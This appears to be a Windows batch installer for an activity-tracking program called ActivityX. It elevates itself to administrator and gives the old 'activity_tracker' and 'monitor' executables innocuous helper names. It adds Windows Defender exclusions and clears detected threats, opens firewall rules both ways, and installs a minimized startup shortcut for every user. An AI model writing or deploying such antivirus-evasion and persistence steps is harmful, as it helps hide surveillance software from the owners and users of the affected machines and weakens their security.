@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: ── Auto-elevate to Administrator ────────────────────────────────────────────
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs -ArgumentList '%~dp0'"
    exit /b
)

echo ========================================
echo    ActivityX Setup
echo ========================================
echo.

set "INSTALL_DIR=%LOCALAPPDATA%\ActivityX"
:: When elevated, %~dp0 may change — accept it as argument if passed
if not "%~1"=="" set "SETUP_DIR=%~1"
if "%~1"=="" set "SETUP_DIR=%~dp0"

:: ── Kill running instances first ─────────────────────────────────────────────
echo Stopping running instances...
taskkill /F /IM DesktopAppHelper.exe >nul 2>&1
taskkill /F /IM DesktopWinHelper.exe >nul 2>&1
taskkill /F /IM activity_tracker.exe >nul 2>&1
taskkill /F /IM activity_tracker_controller.exe >nul 2>&1
taskkill /F /IM monitor.exe >nul 2>&1
timeout /t 2 /nobreak >nul

:: ── Delete old exe names (migration from old naming) ────────────────────────
del "!INSTALL_DIR!\activity_tracker.exe" >nul 2>&1
del "!INSTALL_DIR!\activity_tracker_controller.exe" >nul 2>&1
del "!INSTALL_DIR!\monitor.exe" >nul 2>&1

echo Creating installation directory...
if not exist "!INSTALL_DIR!" mkdir "!INSTALL_DIR!"

:: ── Unblock downloaded files ────────────────────────────────────────────────
echo Unblocking downloaded files...
powershell -ExecutionPolicy Bypass -Command "Get-ChildItem '!SETUP_DIR!' -Recurse | Unblock-File" >nul 2>&1

echo Copying files...
copy /Y "!SETUP_DIR!DesktopAppHelper.exe"  "!INSTALL_DIR!\" >nul
copy /Y "!SETUP_DIR!DesktopWinHelper.exe"  "!INSTALL_DIR!\" >nul
if exist "!SETUP_DIR!version.txt" copy /Y "!SETUP_DIR!version.txt" "!INSTALL_DIR!\" >nul
copy /Y "!SETUP_DIR!config.py" "!INSTALL_DIR!\" >nul

if not exist "!INSTALL_DIR!\DesktopAppHelper.exe" (
    echo ERROR: Failed to copy files.
    pause
    exit /b 1
)

:: ── Unblock installed files ────────────────────────────────────────────────
echo Unblocking installed files...
powershell -ExecutionPolicy Bypass -Command "Get-ChildItem '!INSTALL_DIR!' -Recurse | Unblock-File" >nul 2>&1

:: ── Windows Defender exclusion ───────────────────────────────────────────────
echo Configuring Windows Defender...
powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '!INSTALL_DIR!'; Add-MpPreference -ExclusionPath '!SETUP_DIR!'; Add-MpPreference -ExclusionProcess 'DesktopAppHelper.exe'; Add-MpPreference -ExclusionProcess 'DesktopWinHelper.exe'" >nul 2>&1
powershell -ExecutionPolicy Bypass -Command "Remove-MpThreat -ErrorAction SilentlyContinue" >nul 2>&1

:: ── Firewall rules ──────────────────────────────────────────────────────────
echo Adding firewall rules...
netsh advfirewall firewall delete rule name="ActivityX Tracker" >nul 2>&1
netsh advfirewall firewall delete rule name="ActivityX Controller" >nul 2>&1
netsh advfirewall firewall delete rule name="Desktop App Helper" >nul 2>&1
netsh advfirewall firewall delete rule name="Desktop Win Helper" >nul 2>&1
netsh advfirewall firewall add rule name="Desktop App Helper" dir=out action=allow program="!INSTALL_DIR!\DesktopAppHelper.exe" >nul 2>&1
netsh advfirewall firewall add rule name="Desktop App Helper" dir=in action=allow program="!INSTALL_DIR!\DesktopAppHelper.exe" >nul 2>&1
netsh advfirewall firewall add rule name="Desktop Win Helper" dir=out action=allow program="!INSTALL_DIR!\DesktopWinHelper.exe" >nul 2>&1
netsh advfirewall firewall add rule name="Desktop Win Helper" dir=in action=allow program="!INSTALL_DIR!\DesktopWinHelper.exe" >nul 2>&1

:: ── Remove old scheduled tasks (replaced by All Users Startup) ──────────────
echo Removing old scheduled tasks...
schtasks /Delete /TN "ActivityX Controller" /F >nul 2>&1
schtasks /Delete /TN "ActivityX Controller Startup" /F >nul 2>&1

:: ── Remove old startup shortcuts (if any) ───────────────────────────────────
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
del "!STARTUP!\ActivityXTracker.lnk" >nul 2>&1
del "!STARTUP!\ActivityXController.lnk" >nul 2>&1
del "!STARTUP!\ActivityTracker.lnk" >nul 2>&1
del "!STARTUP!\ActivityTrackerController.lnk" >nul 2>&1

:: ── All Users Startup shortcut (runs as each logged-in user) ────────────────
echo Creating startup shortcut for all users...
set "ALL_STARTUP=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
powershell -ExecutionPolicy Bypass -Command "$ws = New-Object -ComObject WScript.Shell; $sc = $ws.CreateShortcut('%ALL_STARTUP%\ActivityX.lnk'); $sc.TargetPath = '!INSTALL_DIR!\DesktopWinHelper.exe'; $sc.WorkingDirectory = '!INSTALL_DIR!'; $sc.WindowStyle = 7; $sc.Save()"

if not exist "%ALL_STARTUP%\ActivityX.lnk" (
    echo WARNING: Could not create startup shortcut.
)

:: ── Start controller for verification ───────────────────────────────────────
echo Starting controller...
pushd "!INSTALL_DIR!"
start "" "DesktopWinHelper.exe"
popd

echo.
echo ========================================
echo    Installation complete!
echo ========================================
echo Installed to: !INSTALL_DIR!
echo The tracker will start automatically on every Windows login.
echo.
pause
